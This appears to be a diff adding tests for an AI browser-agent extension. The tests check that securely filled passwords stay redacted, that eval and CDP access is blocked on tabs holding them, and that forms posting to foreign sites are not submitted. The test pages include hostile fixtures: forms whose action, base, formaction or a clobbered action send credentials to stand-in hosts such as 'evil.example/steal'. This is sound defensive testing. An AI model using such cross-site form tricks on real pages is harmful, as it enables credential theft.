+        const frameTree = await browser.cdp.send("Page.getFrameTree");
+        const iso = await browser.cdp.send("Page.createIsolatedWorld", {
+          frameId: frameTree.frameTree.frame.id,
+          worldName,
+        });
+        return iso.executionContextId;
+      };
+      let topCtxId = await createTopWorld("botkins-secret-guard-1");
+
+      const tabA = {
+        id: 301,
+        windowId: 1,
+        title: "Example Portal Sign In",
+        url: pageUrlA,
+        active: true,
+        pinned: false,
+        groupId: -1,
+        incognito: false,
+        status: "complete",
+      };
+      const tabB = {
+        id: 302,
+        windowId: 1,
+        title: "Other Tab",
+        url: pageUrlB,
+        active: false,
+        pinned: false,
+        groupId: -1,
+        incognito: false,
+        status: "complete",
+      };
+      const tabs = new Map([
+        [tabA.id, tabA],
+        [tabB.id, tabB],
+      ]);
+
+      let debuggerAttachCalls = 0;
+      let cdpSendCalls = 0;
+
+      globalThis.chrome = {
+        tabs: {
+          query: async () => [...tabs.values()],
+          get: async (id) => {
+            const t = tabs.get(id);
+            if (!t) throw new Error(`No tab ${id}`);
+            return t;
+          },
+          update: async (id, patch) => {
+            const t = tabs.get(id);
+            if (!t) throw new Error(`No tab ${id}`);
+            const prevUrl = t.url;
+            Object.assign(t, patch);
+            if (id === tabA.id && patch.url && patch.url !== prevUrl && !patch.url.startsWith(`${prevUrl}#`)) {
+              await browser.navigate(patch.url);
+              topCtxId = await createTopWorld(`botkins-secret-guard-nav-${Date.now()}`);
+            }
+            return t;
+          },
+          reload: async (id) => {
+            if (id === tabA.id) {
+              await browser.navigate(tabA.url);
+              topCtxId = await createTopWorld(`botkins-secret-guard-reload-${Date.now()}`);
+            }
+          },
+          captureVisibleTab: async () => "data:image/jpeg;base64,Vk1JR0VDTk9DRFA=",
+        },
+        windows: { update: async () => ({}) },
+        tabGroups: { query: async () => [] },
+        scripting: {
+          executeScript: async (injection) => {
+            const tid = injection.target?.tabId;
+            if (tid === tabB.id) {
+              if (injection.world === "MAIN") {
+                return [{ frameId: 0, result: { ok: true, value: "tab-b-eval-ok" } }];
+              }
+              return [{ frameId: 0, result: { ok: true } }];
+            }
+            if (injection.world === "MAIN") {
+              const fnSrc = injection.func.toString();
+              const argsJson = JSON.stringify(injection.args || []);
+              const result = await browser.cdp.evalInContext(`(${fnSrc})(...${argsJson})`);
+              return [{ frameId: 0, result }];
+            }
+            if (injection.files) {
+              await browser.cdp.evalInContext(driverCode, { contextId: topCtxId });
+              return [{ frameId: 0, result: undefined }];
+            }
+            const fnSrc = injection.func.toString();
+            const argsJson = JSON.stringify(injection.args || []);
+            const result = await browser.cdp.evalInContext(`(${fnSrc})(...${argsJson})`, {
+              contextId: topCtxId,
+            });
+            return [{ frameId: 0, result }];
+          },
+        },
+        debugger: {
+          onDetach: { addListener: () => {} },
+          attach: async () => {
+            debuggerAttachCalls++;
+          },
+          detach: async () => {},
+          sendCommand: async (_target, method) => {
+            cdpSendCalls++;
+            return { result: { value: `cdp-ok:${method}` } };
+          },
+        },
+      };
+
+      const ctrl = new BrowserController({
+        getSettings: async () => ({ enabled: true, mode: "all", groupName: "Botkins", groupColor: "orange", pausedTabIds: [] }),
+        uploadScreenshot: async (b64, name) => `uploaded:${name}:${b64.length}`,
+      });
+
+      // Fill email (text), password (password), and non-password tenant_code (code) without submitting.
+      const sentinelPass = "SENTINEL_GUARD_PW_9x7z!";
+      const sentinelCode = "SENTINEL_GUARD_CODE_448822";
+      const fillRes = await ctrl.runSecureFill({
+        tabId: tabA.id,
+        origin: originA,
+        allowLocalHttp: true,
+        fields: [
+          { key: "LoginModel.Email", kind: "text", value: "user@example.test" },
+          { key: "LoginModel.Password", kind: "password", value: sentinelPass },
+          { key: "tenant_code", kind: "code", value: sentinelCode },
+        ],
+        submit: false,
+      });
+      assert.deepEqual(fillRes, {
+        filled: ["LoginModel.Email", "LoginModel.Password", "tenant_code"],
+        missing: [],
+      });
+
+      const toolOutputs = [JSON.stringify(fillRes)];
+      const assertNoSentinels = (label, raw) => {
+        const s = typeof raw === "string" ? raw : JSON.stringify(raw);
+        assert.equal(s.includes(sentinelPass), false, `${label} leaked password sentinel`);
+        assert.equal(s.includes(sentinelCode), false, `${label} leaked code sentinel`);
+      };
+
+      // 1. browser_eval and browser_cdp on Tab A are refused without touching MAIN world or debugger.
+      await assert.rejects(
+        () => ctrl.run("browser_eval", { tabId: tabA.id, expression: `document.querySelector('input[type=password]').value` }),
+        (err) => {
+          assert.match(err.message, /securely filled value/i);
+          assertNoSentinels("browser_eval err", err.message);
+          return true;
+        },
+      );
+      await assert.rejects(
+        () =>
+          ctrl.run("browser_cdp", {
+            tabId: tabA.id,
+            method: "Runtime.evaluate",
+            params: { expression: `document.querySelector('input[type=password]').value`, returnByValue: true },
+          }),
+        (err) => {
+          assert.match(err.message, /securely filled value/i);
+          assertNoSentinels("browser_cdp err", err.message);
+          return true;
+        },
+      );
+      assert.equal(debuggerAttachCalls, 0);
+      assert.equal(cdpSendCalls, 0);
+
+      // 2. Snapshot stays allowed and redacts BOTH type=password AND non-password input filled with kind="code".
+      const snap = await ctrl.run("browser_snapshot", { tabId: tabA.id });
+      toolOutputs.push(JSON.stringify(snap));
+      const pwEl = snap.elements.find((e) => e.fieldKey === "LoginModel.Password");
+      const codeEl = snap.elements.find((e) => e.fieldKey === "tenant_code");
+      const emailEl = snap.elements.find((e) => e.fieldKey === "LoginModel.Email");
+      assert.ok(pwEl && codeEl && emailEl);
+      assert.equal(pwEl.hasValue, true);
+      assert.equal(pwEl.valueState, "filled");
+      assert.equal("value" in pwEl, false);
+      assert.equal(codeEl.hasValue, true);
+      assert.equal(codeEl.valueState, "filled");
+      assert.equal("value" in codeEl, false, "non-password input filled as kind='code' must be redacted in snapshot");
+      assert.equal(emailEl.value, "user@example.test");
+
+      // Even if the page toggles the password input to type="text", snapshot still redacts it.
+      await browser.cdp.evalInContext(`document.getElementById("login-password").type = "text"`);
+      const snapToggled = await ctrl.run("browser_snapshot", { tabId: tabA.id });
+      toolOutputs.push(JSON.stringify(snapToggled));
+      const pwToggled = snapToggled.elements.find((e) => e.fieldKey === "LoginModel.Password");
+      assert.equal(pwToggled.hasValue, true);
+      assert.equal("value" in pwToggled, false, "password input toggled to type=text must remain redacted");
+      await browser.cdp.evalInContext(`document.getElementById("login-password").type = "password"`);
+
+      // 3. browser_type and browser_select into filled password/code inputs are refused (by ref, selector, and activeElement).
+      const snapFresh = await ctrl.run("browser_snapshot", { tabId: tabA.id });
+      const freshPwRef = snapFresh.elements.find((e) => e.fieldKey === "LoginModel.Password").ref;
+      const freshCodeRef = snapFresh.elements.find((e) => e.fieldKey === "tenant_code").ref;
+      const freshEmailRef = snapFresh.elements.find((e) => e.fieldKey === "LoginModel.Email").ref;
+
+      await assert.rejects(
+        () => ctrl.run("browser_type", { tabId: tabA.id, ref: freshPwRef, text: "append" }),
+        /securely filled value/i,
+      );
+      await assert.rejects(
+        () => ctrl.run("browser_type", { tabId: tabA.id, selector: "#login-password", text: "append" }),
+        /securely filled value/i,
+      );
+      await assert.rejects(
+        () => ctrl.run("browser_type", { tabId: tabA.id, ref: freshCodeRef, text: "999" }),
+        /securely filled value/i,
+      );
+      // Focused element (last filled was tenant_code) must also refuse untargeted browser_type.
+      await assert.rejects(
+        () => ctrl.run("browser_type", { tabId: tabA.id, text: "append-active" }),
+        /securely filled value/i,
+      );
+      await assert.rejects(
+        () => ctrl.run("browser_select", { tabId: tabA.id, ref: freshPwRef, value: "x" }),
+        /securely filled value/i,
+      );
+      assert.equal(
+        await browser.cdp.evalInContext(`document.getElementById("login-password").value`),
+        sentinelPass,
+        "password input value must remain unmodified after refused browser_type",
+      );
+
+      // Typing into a non-secret input on the same tab still works.
+      const typedEmail = await ctrl.run("browser_type", {
+        tabId: tabA.id,
+        ref: freshEmailRef,
+        text: "updated@example.test",
+        clear: true,
+      });
+      toolOutputs.push(JSON.stringify(typedEmail));
+      assert.equal(typedEmail.typed, true);
+
+      // 4. Allowed tools (click, press Enter, scroll, wait, screenshot, tabs) stay allowed and never leak sentinels.
+      toolOutputs.push(JSON.stringify(await ctrl.run("browser_tabs", {})));
+      toolOutputs.push(JSON.stringify(await ctrl.run("browser_scroll", { tabId: tabA.id, direction: "down", amount: 50 })));
+      toolOutputs.push(JSON.stringify(await ctrl.run("browser_screenshot", { tabId: tabA.id })));
+      toolOutputs.push(JSON.stringify(await ctrl.run("browser_press", { tabId: tabA.id, key: "Enter" })));
+      toolOutputs.push(JSON.stringify(await ctrl.run("browser_click", { tabId: tabA.id, selector: "#signin-btn" })));
+      toolOutputs.push(JSON.stringify(await ctrl.run("browser_wait", { tabId: tabA.id, text: "Portal Sign In", timeoutMs: 1000 })));
+      assert.equal(debuggerAttachCalls, 0);
+
+      for (const out of toolOutputs) assertNoSentinels("browser_* tool output", out);
+
+      // 5. Another tab (Tab B) is completely unaffected by Tab A's secret-bearing mark.
+      const evalB = await ctrl.run("browser_eval", { tabId: tabB.id, expression: `"ok"` });
+      assert.equal(evalB.result, "tab-b-eval-ok");
+      const cdpB = await ctrl.run("browser_cdp", { tabId: tabB.id, method: "Runtime.evaluate", params: { expression: "1+1" } });
+      assert.equal(cdpB.result?.result?.value, "cdp-ok:Runtime.evaluate");
+
+      // 6. Hash-only navigation on Tab A does NOT clear the secret-bearing mark.
+      await ctrl.run("browser_navigate", { tabId: tabA.id, url: `${pageUrlA}#step2` });
+      await assert.rejects(
+        () => ctrl.run("browser_eval", { tabId: tabA.id, expression: `1 + 1` }),
+        /securely filled value/i,
+      );
+
+      // 7. SPA submit clearing: emptying the password input and removing the code input clears the mark without navigation.
+      await browser.cdp.evalInContext(`
+        document.getElementById("login-password").value = "";
+        document.getElementById("tenant_code").remove();
+      `);
+      const evalAfterSpaClear = await ctrl.run("browser_eval", { tabId: tabA.id, expression: `document.title` });
+      assert.equal(evalAfterSpaClear.result, "Example Portal Sign In");
+      const cdpAfterSpaClear = await ctrl.run("browser_cdp", { tabId: tabA.id, method: "DOM.getDocument" });
+      assert.equal(cdpAfterSpaClear.result?.result?.value, "cdp-ok:DOM.getDocument");
+
+      // 8. Re-fill and verify full navigation commits a new document and clears the mark.
+      await ctrl.runSecureFill({
+        tabId: tabA.id,
+        origin: originA,
+        allowLocalHttp: true,
+        fields: [{ key: "LoginModel.Password", kind: "password", value: sentinelPass }],
+        submit: false,
+      });
+      await assert.rejects(
+        () => ctrl.run("browser_eval", { tabId: tabA.id, expression: `1 + 1` }),
+        /securely filled value/i,
+      );
+      await ctrl.run("browser_navigate", { tabId: tabA.id, url: `${baseUrl}/login-with-foreign-extension.html` });
+      const evalAfterNav = await ctrl.run("browser_eval", { tabId: tabA.id, expression: `location.pathname` });
+      assert.equal(evalAfterNav.result, "/login-with-foreign-extension.html");
+      const cdpAfterNav = await ctrl.run("browser_cdp", { tabId: tabA.id, method: "Runtime.evaluate", params: { expression: "2+2" } });
+      assert.equal(cdpAfterNav.result?.result?.value, "cdp-ok:Runtime.evaluate");
+    } finally {
+      await browser.close();
+      server.close();
+    }
+  },
+);
+
+test(
+  "secureFill submits a same-site form, and fills but refuses to submit a form whose action, formaction, base or clobbered action points at another site",
+  { skip: !chromeBin ? "No Chromium/Chrome binary available on this host" : false },
+  async () => {
+    const driverCode = readFileSync(driverBundlePath, "utf8");
+    const form = (action, extra = "") => `<!doctype html><html><head>${extra.startsWith("<base") ? extra : ""}</head><body>
+      <form id="f" method="post"${action === null ? "" : ` action="${action}"`}>
+        ${extra.startsWith("<input") ? extra : ""}
+        <input id="pw" name="password" type="password" value="">
+        <button id="go" type="submit"${extra.startsWith("formaction") ? " " + extra : ""}>Sign In</button>
+      </form>
+      ${extra.startsWith("<button") ? extra : ""}
+      <script>
+        window.__submits = 0;
+        document.getElementById("f").addEventListener("submit", (e) => { e.preventDefault(); window.__submits++; });
+      </script>
+    </body></html>`;
+    const pages = {
+      "/no-action": form(null),
+      "/same-origin": form("/login"),
+      "/evil-action": form("https://evil.example/collect"),
+      "/evil-base": form("collect", `<base href="https://evil.example/">`),
+      "/evil-formaction": form("/login", `formaction="https://evil.example/steal"`),
+      "/evil-external-submitter": form("/login", `<button type="submit" form="f" formaction="https://evil.example/steal">External</button>`),
+      "/evil-clobbered": form("https://evil.example/collect", `<input name="action" value="/local-decoy">`),
+    };
+    const server = http.createServer((req, res) => {
+      const path = (req.url || "/").split("?")[0];
+      if (!Object.hasOwn(pages, path)) {
+        res.writeHead(404);
+        res.end("Not found");
+        return;
+      }
+      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
+      res.end(pages[path]);
+    });
+    await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
+    const origin = `http://127.0.0.1:${server.address().port}`;
+    const browser = await launchChromium(chromeBin);
+    const dummySecret = "dummy-test-pass-001";
+
+    async function fillOn(path, submit) {
+      await browser.navigate(`${origin}${path}`);
+      const frameTree = await browser.cdp.send("Page.getFrameTree");
+      const isolated = await browser.cdp.send("Page.createIsolatedWorld", {
+        frameId: frameTree.frameTree.frame.id,
+        worldName: `botkins-submit-${path}`,
+      });
+      const contextId = isolated.executionContextId;
+      await browser.cdp.evalInContext(driverCode, { contextId });
+      const payload = { origin, allowLocalHttp: true, submit, fields: [{ key: "password", kind: "password", value: dummySecret }] };
+      const res = await browser.cdp.evalInContext(`window.__botkinsDomDriver.dispatch("secureFill", ${JSON.stringify(payload)})`, { contextId });
+      const pw = await browser.cdp.evalInContext(`document.getElementById("pw").value`);
+      const submits = await browser.cdp.evalInContext(`window.__submits`);
+      return { res, pw, submits };
+    }
+
+    try {
+      for (const path of ["/no-action", "/same-origin"]) {
+        const ok = await fillOn(path, true);
+        assert.equal(ok.res.ok, true, path);
+        assert.deepEqual(ok.res.filled, ["password"]);
+        assert.equal(ok.res.submitted, true, `${path} is the same site and must be submitted`);
+        assert.equal(ok.res.submitRefused, undefined);
+        assert.equal(ok.submits, 1);
+        assert.equal(ok.pw, dummySecret);
+      }
+
+      for (const path of ["/evil-action", "/evil-base", "/evil-formaction", "/evil-external-submitter", "/evil-clobbered"]) {
+        const refused = await fillOn(path, true);
+        assert.equal(refused.res.ok, true, `${path} still fills`);
+        assert.deepEqual(refused.res.filled, ["password"]);
+        assert.equal(refused.res.submitted, false, `${path} must not be submitted`);
+        assert.equal(refused.res.submitRefused, "cross_site_action", path);
+        assert.equal(refused.submits, 0, `${path} must never fire a submit`);
+        assert.equal(refused.pw, dummySecret);
+      }
+
+      const fillOnly = await fillOn("/evil-action", false);
+      assert.equal(fillOnly.res.submitted, false);
+      assert.equal(fillOnly.res.submitRefused, undefined, "no submit asked for, so nothing to refuse");
+    } finally {
+      await browser.close();
+      server.close();
+    }
+  },
+);
+
